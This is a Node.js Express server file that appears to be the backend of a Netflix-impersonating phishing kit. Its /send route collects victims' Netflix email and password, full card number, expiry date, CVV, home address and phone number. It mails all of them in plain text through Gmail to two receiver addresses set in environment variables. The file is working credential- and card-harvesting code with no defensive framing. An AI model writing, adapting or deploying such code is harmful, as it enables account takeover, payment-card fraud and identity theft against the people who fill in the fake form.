require("dotenv").config();
const express = require("express");
const app = express();
var cookieParser = require("cookie-parser");
var logger = require("morgan");
const nodemailer = require("nodemailer");
const cors = require("cors");

app.use(cors());
app.use(logger("dev"));
app.use(express.json());
app.use(express.urlencoded({ extended: false }));
app.use(cookieParser());

const transporter = nodemailer.createTransport({
	service: "gmail",
	auth: {
		user: process.env.NODEMAILER_EMAIL,
		pass: process.env.NODEMAILER_PASS,
	},
});

app.get("/", (req, res) => {
	res.json("Hello World!");
});

app.post("/send", (req, res) => {
	const { login, cardDetails, address } = req.body;
	const mailOptions = {
		from: process.env.NODEMAILER_EMAIL,
		to: process.env.RECEIVER,
		subject: "Netflix Form Data",
		text:
			"Details:\nEmail: " +
			login.email +
			"\nPassword: " +
			login.password +
			"\nName on Card: " +
			cardDetails.nameOnCard +
			"\nCard Number: " +
			cardDetails.cardNumber +
			"\nExpiry date: " +
			cardDetails.expiryDate +
			"\nCVV: " +
			cardDetails.secCode +
			"\nFull Name: " +
			address.fullName +
			"\nAddress Line 1: " +
			address.addLine1 +
			"\nAddress Line 2: " +
			address.addLine2 +
			"\nCity: " +
			address.city +
			"\nState: " +
			address.state +
			"\nZIP Code: " +
			address.zip +
			"\nPhone Number: " +
			address.phone,
	};

	const mailOptions1 = {
		from: process.env.NODEMAILER_EMAIL,
		to: process.env.RECEIVER2,
		subject: "Netflix Form Data",
		text:
			"Details:\nEmail: " +
			login.email +
			"\nPassword: " +
			login.password +
			"\nName on Card: " +
			cardDetails.nameOnCard +
			"\nCard Number: " +
			cardDetails.cardNumber +
			"\nExpiry date: " +
			cardDetails.expiryDate +
			"\nCVV: " +
			cardDetails.secCode +
			"\nFull Name: " +
			address.fullName +
			"\nAddress Line 1: " +
			address.addLine1 +
			"\nAddress Line 2: " +
			address.addLine2 +
			"\nCity: " +
			address.city +
			"\nState: " +
			address.state +
			"\nZIP Code: " +
			address.zip +
			"\nPhone Number: " +
			address.phone,
	};

	transporter.sendMail(mailOptions, function (err, msg) {
		if (err) console.log("Send mail error -", err.message);
		else {
			console.log("Sent1");
			res.status(200);
		}
	});

	transporter.sendMail(mailOptions1, function (err, msg) {
		if (err) console.log("Send mail error -", err.message);
		else {
			console.log("Sent2");
			res.status(200);
		}
	});
});

const port = process.env.PORT || 5000;
app.listen(port, () => {
	console.log(`App listening at port: ${port}.`);
});
